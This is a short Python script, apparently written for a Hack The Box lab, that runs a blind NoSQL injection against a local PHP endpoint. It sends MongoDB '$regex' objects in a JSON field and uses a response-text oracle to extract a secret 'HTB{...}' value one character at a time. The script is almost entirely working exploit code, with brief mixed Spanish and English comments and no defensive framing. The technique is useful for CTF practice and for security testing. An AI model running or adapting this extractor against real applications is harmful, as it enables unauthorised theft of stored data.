#!/usr/bin/python3

import requests
import json

# Oracle
def oracle(t):
    r = requests.post(
        "http://127.0.0.1/index.php",  #### url
        headers = {"Content-Type": "application/json"},
        data = json.dumps({"VARIABLE": t})  #### Inicio del jason que se enviará
    )
    return "bmdyy" in r.text ### respuesta afirmativa en " "

# Make sure the oracle is functioning correctly
assert (oracle("X") == False)
assert (oracle({"$regex": "^HTB{.*"}) == True) ### data basica to send

# Dump the tracking number
trackingNum = "HTB{" # Tracking number is known to start with 'HTB{'
for _ in range(32): # Repeat the following 32 times
    for c in "0123456789abcdefghijklmnopqrstuvwxyz": # caracteres a probar
        if oracle({"$regex": "^" + trackingNum + c}): # Check if <trackingNum> + <char> matches with $regex
            trackingNum += c # If it does, append character to trackingNum ...
            break # ... and break out of the loop
trackingNum += "}" # Append known '}' to end of tracking number

assert (oracle(trackingNum) == True)

print("DATA: " + trackingNum)
